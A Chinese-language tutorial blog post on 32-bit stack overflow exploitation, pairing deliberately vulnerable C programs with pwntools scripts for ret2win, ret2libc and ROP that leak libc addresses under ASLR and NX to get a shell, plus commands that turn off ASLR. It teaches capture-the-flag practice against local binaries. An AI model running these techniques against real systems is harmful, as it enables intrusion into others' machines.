---
title: Stack Overflow Exploit
date: 2018-06-08
tags: [pwn,ctf]
---

本文主要包括简单的栈溢出问题以及绕过一些防护措施的方法！

<!-- more -->

##前置技能

- Basic C Knowledge
- Basic x86 assembly language
- Basic gcc as well as Linux command  

## 基本例子（无防护措施）

```c
// stack_example_1.c
// gcc stack_example_1.c -m32 -fno-stack-protector -z execstack -no-pie -o stack_example_1
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void success() { write(1, " You PWN me! \n", 12); exit(0); }
void vulnerable() {
  char s[16];
  read(0, s, 0x100);
  write(1, s, strlen(s));
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

禁用系统的ASLR：`sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"`

先 gdb 调试，使用 `pattern create` 和 `pattern offset` 计算出返回地址所在位置，再获取 success 函数的地址，把返回地址换成 success 函数的地址（覆盖原有的返回值的），就可以执行到 success 函数了。利用脚本如下。

```python
#!/usr/bin/env python
# coding: utf-8
# exp1.py

from pwn import *

io = process('./stack_example_1')
elf = ELF('./stack_example_1')
success_addr = elf.symbols['success']

payload = '&'*28 + p32(success_addr)
io.send(payload)

print io.recv()
```



## Ret2libc（开启NX）

```c
// stack_example_2.c
// gcc stack_example_2.c -m32 -fno-stack-protector -no-pie -o stack_example_2
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vulnerable() {
  char s[16];
  read(0, s, 0x100);
  write(1, s, strlen(s));
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

因为堆栈不可执行了，那么只需要把代码跳转去可执行的区段（libc中）就可以了。所以用 ldd 查看下 libc 的偏移，再加上system函数的在 libc 中的偏移，传个参数，就可以 getshell。

```python
#!/usr/bin/env python
# coding: utf-8
# exp2.py

from pwn import *

io = process('./stack_example_2')
elf = ELF('./stack_example_2')
libc = ELF('./libc.so.6')

main_addr = elf.symbols['main']
libc_base_addr = 0xf7e00000 # ldd ./stack_example_2
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search('/bin/sh')) + libc_base_addr

payload = '&'*28 + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
io.send(payload)
io.recv()

io.interactive()
```



## ROP（开启ASLR+NX，有libc）

 ```c
// stack_example_3.c
// gcc stack_example_3.c -m32 -fno-stack-protector -no-pie -o stack_example_3
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vulnerable() {
  char s[16];
  read(0, s, 0x100);
  write(1, s, strlen(s));
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
 ```

开启ASLR：`sudo sh -c "echo 2 > /proc/sys/kernel/randomize_va_space"`

由于系统开启了随机化，libc 的地址被随机了，所以要先泄漏一个 libc 里函数的地址，在通过相对偏移计算其他函数，例如 system 和 /bin/sh 的地址，最后 getshell。

```python
#!/usr/bin/env python
# coding: utf-8
# exp3.py

from pwn import *

io = process('./stack_example_3')
elf = ELF('./stack_example_3')
libc = ELF('./libc.so.6')

main_addr = elf.symbols['main']
plt_write = elf.symbols['write']
got_write = elf.got['write']

# get write_addr
payload = '&'*28 + p32(plt_write) + p32(main_addr) + p32(1) +p32(got_write) + p32(4)
io.send(payload)
write_addr = u32(io.recv()[-4:])

# calc system_addr and binsh_addr
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
payload = '&'*28  + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
io.send(payload)
io.recv()

io.interactive()
```



## ROP（开启ASLR+NX，无libc）

先泄漏两个libc中函数的地址，再去在线的 [libc database](https://libc.blukat.me/) 中找服务器使用的libc版本。

```python
#!/usr/bin/env python
# coding: utf-8
# leak.py

from pwn import *

io = process('./stack_example_4')
elf = ELF('./stack_example_4')

main_addr = elf.symbols['main']
plt_write = elf.symbols['write']
got_write = elf.got['write']
read_write = elf.got['read']

# leak write_addr
payload = '&'*28 + p32(plt_write) + p32(main_addr) + p32(1) +p32(got_write) + p32(4)
io.send(payload)
write_addr = u32(io.recv()[-4:])
print 'write_addr: ', hex(write_addr)

# leak read_write
payload = '&'*28 + p32(plt_write) + p32(main_addr) + p32(1) +p32(read_write) + p32(4)
io.send(payload)
read_addr = u32(io.recv()[-4:])
print 'read_addr : ', hex(read_addr)
```

然后再当作有libc的题做

```python
#!/usr/bin/env python
# coding: utf-8
# exp4.py

from pwn import *

io = process('./stack_example_4')
elf = ELF('./stack_example_4')
libc = ELF('./libc6_2.27-3ubuntu1_i386.so')

main_addr = elf.symbols['main']
plt_write = elf.symbols['write']
got_write = elf.got['write']

# get write_addr
payload = '&'*28 + p32(plt_write) + p32(main_addr) + p32(1) +p32(got_write) + p32(4)
io.send(payload)
write_addr = u32(io.recv()[-4:])

# calc system_addr and binsh_addr
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
payload = '&'*28  + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
io.send(payload)
io.recv()

io.interactive()
```

